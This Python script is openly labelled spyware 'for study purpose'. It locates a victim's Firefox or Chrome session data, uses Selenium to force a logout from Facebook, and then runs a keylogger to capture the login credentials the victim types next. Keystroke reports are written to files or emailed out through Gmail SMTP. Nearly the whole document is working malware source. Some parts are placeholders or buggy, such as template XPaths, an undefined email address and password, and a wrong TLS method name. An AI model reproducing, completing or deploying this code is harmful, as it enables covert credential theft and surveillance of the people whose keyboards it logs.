#!/usr/bin/env python3

'''
This is a spyware written only for STUDY PURPOSE in order to become familiar with 'selenium' and automation.
The idea is to log out a potential target from a website (in this case facebook) in such way that you could
register the login credential by means of a keylogger after victim's typing for log in.

The PARAMETERS section gets information about the browser, the OS and wheter sending report through mail or
by writing a file.
The CLEANER section is responsable for the automation of log out process on a facebook home page.
The KEYLOGGER section runs after the log out by automation and registers keyboard typing.

This script requires a lot of software pre-installed on computer and continuously being updated therefore it
is possible that it could not work everywhere.

'''

import keyboard
import os
import re
import time
import smtplib
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from datetime import datetime
from threading import Timer



### PARAMETERS ###

while True: # choose OS
    
    OS = input('OS (Windows, Linux): ')
    
    try:
        if OS != 'Windows' and OS != 'Linux':
            raise Exception
        else:
            break
    except Exception:
        print('Type Windows or Linux')
 
while True: # choose browser

    BROWSER = input('Chrome or Firefox: ')
    
    try:
        if BROWSER != 'Chrome' and BROWSER != 'Firefox':
            raise Exception
        else:
            break
    except Exception:
        print('Type Chrome or Firefox')

OUTPUT_TYPE = 'file' #or 'mail'

REPORT_INTERVAL = int(input('get report every (seconds): '))

WEBSITE = 'https://www.facebook.com'



### CLEANER ###

class Logger():
    
    def __init__(self, os, browser, url):
        
        self.os = os
        self.browser = browser
        self.url = url
    
    def find_data_path(self):
        
        '''
        This method allows to recover path to database where sessions data are stored.
        Data are not found by os.walk() for some reason therefore we first get the directory
        which contains them, list it and eventually recover the database.
        Name of data is composed by random letters then we need regex to find them
        
        '''
      
        r = 'C:' if self.os == 'Windows' else '/home'
        
        if self.browser == 'Firefox':
            for root, dir, files in os.walk(r):
                for f in dir:
                    if f == 'firefox':
                        path = os.path.join(root, f).split(' ')
                        for p in path:
                            if p[-17:] == '/.mozilla/firefox':  # assuring it is the right folder
                                for file in os.listdir(p):
                                    if re.findall('.........default-release', file):
                                        return (p + '/' + file)
        if self.browser == 'Chrome':
            for root, dir, files in os.walk(r):
                for f in dir:
                    if f == 'Sessions':
                        path = os.path.join(root, f).split(' ')
                        for p in path:
                            if p[-39:] == '/.config/google-chrome/Default/Sessions':
                                for file in os.listdir(p):
                                    if re.findall('Session_.................', file):
                                        return (p + '/' + file)
    
    def logging_out(self):
        
        '''
        This method creates a new browser session, opens the website page where the user is 
        already logged in thank to session data whose path is passed by find_data_path() method
        
        '''
        
        if self.browser == 'Firefox':
            
            executable_path = '<path to geckodriver>'
            
            fp = webdriver.FirefoxProfile(self.find_data_path())

            driver = webdriver.Firefox(executable_path=executable_path, firefox_profile=fp)
            driver.get(self.url)
            
            # here selenium clicks on the two buttons which allow to log out
            
            logout1 = driver.find_element_by_xpath('<html xpath botton>')
            logout1.click()

            time.sleep(2)
            
            logout2 =driver.find_element_by_xpath('<html xpath botton>')
            logout2.click()

            driver.quit()
            
        if self.browser == 'Chrome':
            
            executable_path = '<path to chromedriver>'
            
            options = webdriver.ChromeOptions()
            options.add_argument(self.find_data_path())
            
            driver = webdriver.Chrome(executable_path=executable_path, chrome_options=options)
            driver.get(self.url)
            
            logout1 = driver.find_element_by_xpath('<html xpath botton>')
            logout1.click()

            time.sleep(2)
            
            logout2 =driver.find_element_by_xpath('<html xpath botton>')
            logout2.click()

            driver.quit()
            
    @classmethod
    def run(cls):
        
        '''
        Classmethod which instantiates the class and calls clean_data()
        
        '''
        
        cls(OS, BROWSER, WEBSITE).logging_out()



### KEYLOGGER ###

class Keylogger:
    
    def __init__(self, interval, output_type="file"):

        self.interval = interval  #REPORT_INTERVAL
        self.output_type = output_type  #OUTPUT_TYPE
        self.data = ""
        self.n_report = 1
        # format (y, m, d, h, m, s, ??)
        self.time = datetime.now()
        
    def save_report(self):
        
        '''
        print report on file
        
        '''
        
        self.time = datetime.now()
        filename = f'keylog_{self.n_report}_[{str(self.time)[:10].replace(" ", "-").replace(":", "")}].txt'
        header = f'*** {str(self.time)[11:13]}:{str(self.time)[14:16]}:{str(self.time)[17:19]} ***'
        
        with open(f"{filename}", "w") as f:
            print(header, file=f)
            print(self.data, file=f)
        
        print(f"[***] {filename} created..")
        
        self.n_report += 1
           
    def sendmail(self, email, password, message):
        
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.runtls()
        
        server.login(email, password)
        server.sendmail(email, email, message)

        server.quit()
        
    def report(self):
        
        """
        This method is called every `self.interval` seconds by Timer class

        """
        
        Timer(interval=self.interval, function=self.report).start()
        
        if self.data:
            
            if self.output_type == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.data)
            elif self.output_type == "file":
                self.save_report()
        
        self.data = ""

    def callback(self, event): 
    
        """
        * self.callback() is called by keyboard.on_release()
        * event is passed by keyboard.on_release() method below
        * self.callback() is invoked whenever a keyboard event is occured
        
        """
        
        name = event.name
        
        if len(name) > 1:  # avoid ctrl, space, enter ecc. events to be registred             
                
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # update data
        self.data += name   
        
    def run(self):

        # run the keylogger
        keyboard.on_release(callback=self.callback)
        # run reporting the keylogs
        self.report()
        # block keyboard thread until CTRL+C is pressed
        keyboard.wait()
           
           
           
if __name__ == "__main__":

    Logger.run()
    keylogger = Keylogger(interval=REPORT_INTERVAL, output_type=OUTPUT_TYPE)
    keylogger.run()            
            
            
           
            
            
            
            
            
            
            
            
            
 
